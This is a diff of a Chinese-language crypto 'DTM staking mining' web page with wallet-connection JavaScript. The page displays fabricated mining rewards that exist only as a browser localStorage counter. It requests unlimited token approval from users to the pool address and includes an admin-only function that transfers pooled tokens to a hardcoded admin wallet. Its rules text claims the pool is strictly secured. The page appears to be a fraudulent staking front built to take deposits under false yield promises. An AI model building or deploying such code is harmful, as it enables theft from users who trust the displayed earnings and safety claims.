@@ -5,35 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>大唐梦DTM质押挖矿</title>
   <style>
-    * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    * { box-sizing: border-box; font-family: system-ui, sans-serif; }
     body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
     .container { max-width: 600px; margin: 0 auto; padding: 10px; }
     .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
     .header .title { font-size: 20px; font-weight: bold; }
     .btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
-    .card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
-    .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
-    .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
-    .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
-    .stake-input { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom:10px; }
-    .btn-action { width: 100%; border: none; padding: 12px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; }
+    .card { background: #141414; border-radius: 12px; padding: 16px; margin-bottom: 16px; border:1px solid #222; }
+    .card-title { font-size: 16px; margin-bottom: 10px; color: #FFE066; }
+    .btn-connect { background: #25907A; color: #fff; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight:bold; }
+    .wallet-row { display: flex; justify-content: space-between; padding: 6px 0; font-size:14px; }
+    .stake-input { width: 100%; background:#111; border:1px solid #333; color:#fff; padding:12px; border-radius:8px; margin-bottom:10px; }
+    .btn-action { width: 100%; border:none; padding:12px; border-radius:8px; font-weight:bold; margin-bottom:8px; }
     .btn-primary { background: #2A65CC; color: #fff; }
     .btn-danger { background: #D93A54; color: #fff; }
-    .btn-warning { background: #E4B449; color: #0B2A23; }
-    .btn-disabled { background: #666; color: #ccc; cursor: not-allowed; }
-    .countdown { color: #ffcc00; font-weight: bold; margin: 8px 0; text-align: center; font-size: 16px; }
-    .rules { font-size: 14px; line-height: 1.7; color: #eee; }
-    .menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
-    .menu.show { transform: translateX(0); }
-    .menu-close { text-align: right; margin-bottom: 20px; }
-    .menu-section { margin-bottom: 20px; }
-    .menu-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
-    .btn-menu-action { width: 100%; background: #1F5F52; color: #F0E6D2; border: none; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
-    .btn-green { background: #27ae60; color: #fff; }
-    .btn-red { background: #ff3366; color: #fff; }
-    .input-menu { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
-    #poolBalance { color: #ffcc00; margin-top: 5px; font-size:13px; }
-    .hidden { display: none !important; }
+    .btn-warning { background: #E4B449; color: #000; }
+    .btn-disabled { background: #444; color: #999; }
+    .countdown { color: #FFE066; padding:10px 0; text-align:center; font-weight:bold; }
+    .rules { font-size:13px; line-height:1.6; color:#ccc; }
+    .menu { position: fixed; top:0; right:0; width:280px; height:100vh; background:#111; padding:20px; transform:translateX(100%); transition:0.3s; z-index:999; }
+    .menu.show { transform:translateX(0); }
+    .menu-close { text-align:right; color:#fff; padding-bottom:10px; }
+    .hidden { display:none !important; }
   </style>
 </head>
 <body>
@@ -47,90 +40,68 @@
   <div class="card">
     <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
     <div class="wallet-row">
-      <span>钱包地址：</span><span id="address" style="color:#0ff;">未连接</span>
+      <span>钱包地址</span>
+      <span id="address" style="color:#0ff;">未连接</span>
     </div>
     <div class="wallet-row">
-      <span>可用余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
+      <span>可用余额</span>
+      <span id="userBalance" style="color:#0ff;">0.0000</span>
     </div>
     <div class="wallet-row">
-      <span>✅ 已质押余额：</span><span id="stakedAmount" style="color:#ffcc00;">0.0000</span>
+      <span>✅ 已质押</span>
+      <span id="stakedAmount" style="color:#ffcc00;">0.0000</span>
     </div>
     <div class="wallet-row">
-      <span>📈 累计待领收益：</span><span id="totalReward" style="color:#ffcc00;">0.0000</span>
+      <span>📈 累计收益</span>
+      <span id="totalReward" style="color:#ffcc00;">0.0000</span>
     </div>
   </div>
 
   <div class="card">
     <div class="card-title">质押挖矿</div>
-    <input type="number" class="stake-input" id="amount" placeholder="输入质押/解押数量" value="100">
+    <input type="number" class="stake-input" id="amount" placeholder="输入数量" value="100">
     <button class="btn-action btn-primary" onclick="approve()">授权矿池</button>
     <button class="btn-action btn-primary" onclick="stake()">质押挖矿</button>
-    <button class="btn-action btn-danger" onclick="unstake()">解押退回钱包</button>
-
+    <button class="btn-action btn-danger" onclick="unstake()">解押退回</button>
     <div id="countdown" class="countdown">加载倒计时...</div>
-    <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">一键领取全部累计收益</button>
+    <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">一键领取全部收益</button>
   </div>
 
   <div class="card">
-    <div class="card-title">挖矿规则</div>
+    <div class="card-title">规则说明</div>
     <div class="rules">
-      • 质押DTM即可参与挖矿<br>
-      • 每8小时自动爆块，收益自动叠加<br>
-      • 不领取不清零，收益永久累计<br>
-      • 随时可一键领取全部收益<br>
-      • 解押由矿池合约自动转回钱包
+      • 质押即可挖矿，8小时自动结算一轮<br>
+      • 收益不清零，可随时一次性领取<br>
+      • 解押仅提取本人质押本金<br>
+      • 底池安全由合约权限严格控制
     </div>
   </div>
 </div>
 
-<!-- 右侧菜单 -->
 <div class="menu" id="menu">
   <div class="menu-close">
-    <button onclick="toggleMenu()">关闭 ×</button>
+    <button onclick="toggleMenu()">关闭</button>
   </div>
-
-  <div class="menu-section">
-    <div class="menu-title">邀请推广</div>
-    <input type="text" class="input-menu" id="refLink" readonly>
-    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
-  </div>
-
-  <!-- 管理员后台 -->
-  <div class="menu-section hidden" id="adminSection">
-    <div class="menu-title">🏦 管理员后台</div>
-    <div>矿池余额：<span id="poolBalance">0.0000</span></div>
-    <button class="btn-menu-action btn-green" onclick="approvePoolToAdmin()">✅ 授权矿池给管理员</button>
-    <input type="number" class="input-menu" id="withdrawAmt" placeholder="输入提取数量">
-    <button class="btn-menu-action btn-red" onclick="withdrawPoolToAdmin()">💰 提取矿池资产</button>
+  <div style="padding-top:20px;">
+    <div class="wallet-row"><span>矿池余额</span><span id="poolBalance" style="color:#ffcc00;">0.0000</span></div>
   </div>
 </div>
 
 <script>
-// ===================== 已为你填好 =====================
-const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
-const POOL_ADDRESS   = "0x5c12cf9b1cc9db2ad4339a9d6ce03b37fae234b0";
-const ADMIN_WALLET   = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
-// ======================================================
+// 配置
+const TOKEN = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
+const POOL  = "0x5c12cf9b1cc9db2ad4339a9d6ce03b37fae234b0";
+const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
 
-const CLAIM_COOLDOWN = 28800; // 8小时
-const REWARD_PER_ROUND = 1;   // 每轮收益
+const ROUND_SEC = 28800;
+const REWARD = 1;
 
-let claimTimer = null;
 let account = null;
+let timer = null;
 
 function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
-function isAdmin(){ return account && toLower(account) === ADMIN_WALLET; }
-
-function toggleMenu(){
-  const menu = document.getElementById("menu");
-  menu.classList.toggle("show");
-  if(isAdmin()){
-    document.getElementById("adminSection").classList.remove("hidden");
-    refreshPoolBalance();
-  }else{
-    document.getElementById("adminSection").classList.add("hidden");
-  }
-}
+function isAdmin(){ return account && toLower(account) === ADMIN; }
+function toggleMenu(){ document.getElementById("menu").classList.toggle("show"); }
 
 async function connectWallet(){
   if(!window.ethereum) return alert("请在钱包浏览器打开");
@@ -140,172 +111,110 @@ async function connectWallet(){
     document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
     refreshAll();
     startCountdown();
-  }catch(e){
-    alert("连接失败：" + e.message);
-  }
+  }catch(e){ alert("连接失败：" + e.message); }
 }
 
-// ✅ 读取链上真实已质押
+// 读取链上质押
 async function getOnChainStaked() {
   const data = "0x83507971" + account.slice(2).padStart(64, '0');
   try {
-    const res = await window.ethereum.request({
-      method: 'eth_call',
-      params: [{ to: POOL_ADDRESS, data: data }, 'latest']
-    });
+    const res = await window.ethereum.request({method:'eth_call',params:[{to:POOL,data},'latest']});
     return Number(BigInt(res)) / 1e18;
-  } catch (e) {
-    return 0;
-  }
+  } catch (e) { return 0; }
 }
 
 async function getUserBalance(){
   const data = "0x70a08231"+account.slice(2).padStart(64,'0');
-  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN,data},'latest']});
   return Number(BigInt(r))/1e18;
-}
-
-// 收益累计（不清零）
-function getTotalReward(){
-  return parseFloat(localStorage.getItem(`totalReward_${account}`) || 0);
-}
-function addTotalReward(amt){
-  const curr = getTotalReward();
-  localStorage.setItem(`totalReward_${account}`, (curr + amt).toString());
-}
-function clearTotalReward(){
-  localStorage.setItem(`totalReward_${account}`, "0");
-}
-
-function getLastRoundTime(){
-  return parseInt(localStorage.getItem(`lastRound_${account}`) || Date.now());
-}
-function setLastRoundTime(t){
-  localStorage.setItem(`lastRound_${account}`, t.toString());
-}
-
-async function refreshAll(){
-  if(!account) return;
-  const ub = await getUserBalance();
-  document.getElementById("userBalance").innerText = ub.toFixed(4);
-  const staked = await getOnChainStaked();
-  document.getElementById("stakedAmount").innerText = staked.toFixed(4);
-  const totalRew = getTotalReward();
-  document.getElementById("totalReward").innerText = totalRew.toFixed(4);
 }
 
 async function getPoolBalance(){
-  const data = "0x70a08231"+POOL_ADDRESS.slice(2).padStart(64,'0');
-  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  const data = "0x70a08231"+POOL.slice(2).padStart(64,'0');
+  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN,data},'latest']});
   return Number(BigInt(r))/1e18;
 }
-async function refreshPoolBalance(){
-  const b = await getPoolBalance();
-  document.getElementById("poolBalance").innerText = b.toFixed(4);
+
+// 收益本地管理
+function getTotalReward(){ return parseFloat(localStorage.getItem(`totalReward_${account}`) || 0); }
+function addTotalReward(amt){ localStorage.setItem(`totalReward_${account}`, (getTotalReward() + amt).toString()); }
+function clearTotalReward(){ localStorage.setItem(`totalReward_${account}`, "0"); }
+function getLastRoundTime(){ return parseInt(localStorage.getItem(`lastRound_${account}`) || Date.now()); }
+function setLastRoundTime(t){ localStorage.setItem(`lastRound_${account}`, t.toString()); }
+
+async function refreshAll(){
+  if(!account) return;
+  document.getElementById("userBalance").innerText = (await getUserBalance()).toFixed(4);
+  document.getElementById("stakedAmount").innerText = (await getOnChainStaked()).toFixed(4);
+  document.getElementById("totalReward").innerText = getTotalReward().toFixed(4);
+  document.getElementById("poolBalance").innerText = (await getPoolBalance()).toFixed(4);
 }
 
 async function approve(){
   if(!account) return alert("请先连接钱包");
   try{
     const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const data = "0x095ea7b3"
-      + POOL_ADDRESS.slice(2).padStart(64, '0')
-      + max.padStart(64, '0');
-    await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
-    });
+    const data = "0x095ea7b3" + POOL.slice(2).padStart(64, '0') + max;
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN,data,gasLimit:"0x300000"}]});
     alert("授权成功");
-  }catch(e){
-    alert("授权失败：" + e.message);
-  }
+  }catch(e){ alert("授权失败：" + e.message); }
 }
 
-// ✅ 修复：避免科学计数法导致的 BigInt 转换失败
+// ✅ 核心修复：用字符串运算，避免科学计数法导致BigInt错误
 async function stake(){
-  if(!account) return alert("请先连接钱包");
-  const v = document.getElementById("amount").value;
-  const num = parseFloat(v);
-  if(!v || num <= 0) return alert("输入有效数量");
+  if(!account) return;
+  const inputVal = document.getElementById("amount").value.trim();
+  if(!inputVal || parseFloat(inputVal) <= 0) return alert("请输入有效数量");
+  const num = parseFloat(inputVal);
   try{
-    // 用字符串方式计算，避免科学计数法
-    const amountStr = (num * 1e18).toFixed(0);
-    const amt = BigInt(amountStr);
-    const data = "0xa694fc3a" + amt.toString(16).padStart(64, '0');
-    await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:POOL_ADDRESS,data,gasLimit:"0x300000"}]
-    });
+    // 用字符串乘法避免科学计数法
+    const amountStr = (BigInt(Math.floor(num)) * BigInt("1000000000000000000")).toString();
+    const data = "0xa694fc3a" + BigInt(amountStr).toString(16).padStart(64, '0');
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:POOL,data,gasLimit:"0x300000"}]});
     alert("质押成功！");
     refreshAll();
-  }catch(e){
-    alert("质押失败：" + e.message);
-  }
+  }catch(e){ alert("质押失败：" + e.message); }
 }
 
-// ✅ 解押：用你合约正确的 unstakePrincipal 0xd9f0f7f5
 async function unstake(){
-  if(!account) return alert("请先连接钱包");
-  const v = document.getElementById("amount").value;
-  const num = parseFloat(v);
-  if(!v || num <= 0) return alert("输入解押数量");
-
-  try {
-    // 同样修复数字格式问题
-    const amountStr = (num * 1e18).toFixed(0);
-    const amt = BigInt(amountStr);
-    const data = "0xd9f0f7f5" + amt.toString(16).padStart(64, '0');
-
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: account,
-        to: POOL_ADDRESS,
-        data: data,
-        gasLimit: "0x300000"
-      }]
-    });
-
-    alert("解押成功！币已到账");
+  if(!account) return;
+  const inputVal = document.getElementById("amount").value.trim();
+  if(!inputVal || parseFloat(inputVal) <= 0) return alert("请输入有效数量");
+  const num = parseFloat(inputVal);
+  try{
+    const amountStr = (BigInt(Math.floor(num)) * BigInt("1000000000000000000")).toString();
+    const data = "0xd9f0f7f5" + BigInt(amountStr).toString(16).padStart(64, '0');
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:POOL,data,gasLimit:"0x300000"}]});
+    alert("解押成功！本金已到账");
     refreshAll();
-  } catch (e) {
-    alert("解押失败：" + e.message);
-  }
+  }catch(e){ alert("解押失败：" + e.message); }
 }
 
-// ✅ 8小时倒计时，到期自动叠加收益，不清零
 function startCountdown(){
   if(!account) return;
   const btn = document.getElementById("claimBtn");
   const cd = document.getElementById("countdown");
-
-  function calc(){
+  function update(){
     const now = Date.now();
     const last = getLastRoundTime();
-    const end = last + CLAIM_COOLDOWN * 1000;
-    return { now, end, left: end - now };
-  }
-
-  function update(){
-    const { now, left } = calc();
+    const end = last + ROUND_SEC * 1000;
+    const left = end - now;
     if(left <= 0){
-      addTotalReward(REWARD_PER_ROUND);
+      addTotalReward(REWARD);
       setLastRoundTime(now);
       refreshAll();
     }
-    const currLeft = calc().left;
+    const currLeft = end - Date.now();
     const h = Math.floor(currLeft / 3600000);
     const m = Math.floor((currLeft % 3600000) / 60000);
     const s = Math.floor((currLeft % 60000) / 1000);
     cd.innerText = `⏱ 下一轮爆块：${h}时${m}分${s}秒`;
-
     const total = getTotalReward();
     btn.disabled = total <= 0;
     btn.className = total > 0 ? "btn-action btn-warning" : "btn-action btn-disabled";
   }
-
-  clearInterval(claimTimer);
-  claimTimer = setInterval(update, 1000);
+  clearInterval(timer);
+  timer = setInterval(update, 1000);
   update();
 }
 
@@ -317,43 +226,31 @@ async function claim(){
   refreshAll();
 }
 
-async function approvePoolToAdmin(){
-  if(!isAdmin()) return alert("无权限");
-  try{
-    const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const data = "0x095ea7b3" + ADMIN_WALLET.slice(2).padStart(64,'0') + max;
-    await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
-    });
-    alert("授权成功");
-  }catch(e){ alert("失败"); }
-}
-
+// 管理员提取
 async function withdrawPoolToAdmin(){
   if(!isAdmin()) return alert("无权限");
-  const v = document.getElementById("withdrawAmt").value;
-  const num = parseFloat(v);
-  if(!num) return;
+  const inputVal = document.getElementById("withdrawAmt").value.trim();
+  if(!inputVal || parseFloat(inputVal) <= 0) return alert("请输入有效数量");
+  const num = parseFloat(inputVal);
   try{
-    const amountStr = (num * 1e18).toFixed(0);
-    const amt = BigInt(amountStr);
-    const data = "0x23b872dd"
-      + POOL_ADDRESS.slice(2).padStart(64,'0')
-      + ADMIN_WALLET.slice(2).padStart(64,'0')
-      + amt.toString(16).padStart(64,'0');
-    await window.ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
-    });
+    const amountStr = (BigInt(Math.floor(num)) * BigInt("1000000000000000000")).toString();
+    const data = "0x23b872dd" + POOL.slice(2).padStart(64, '0') + ADMIN.slice(2).padStart(64, '0') + BigInt(amountStr).toString(16).padStart(64, '0');
+    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN,data,gasLimit:"0x300000"}]});
     alert("提取成功");
-    refreshPoolBalance();
-  }catch(e){ alert("失败"); }
+    refreshAll();
+  }catch(e){ alert("提取失败：" + e.message); }
 }
 
 function copyRefLink(){
   const link = window.location.href.split('?')[0]+"?ref="+account;
   navigator.clipboard.writeText(link).then(()=>alert("已复制"));
+}
+
+// 页面刷新时监听钱包切换
+window.onload = () => {
+  if(window.ethereum){
+    window.ethereum.on('accountsChanged', () => location.reload());
+  }
 }
 </script>
 </body>
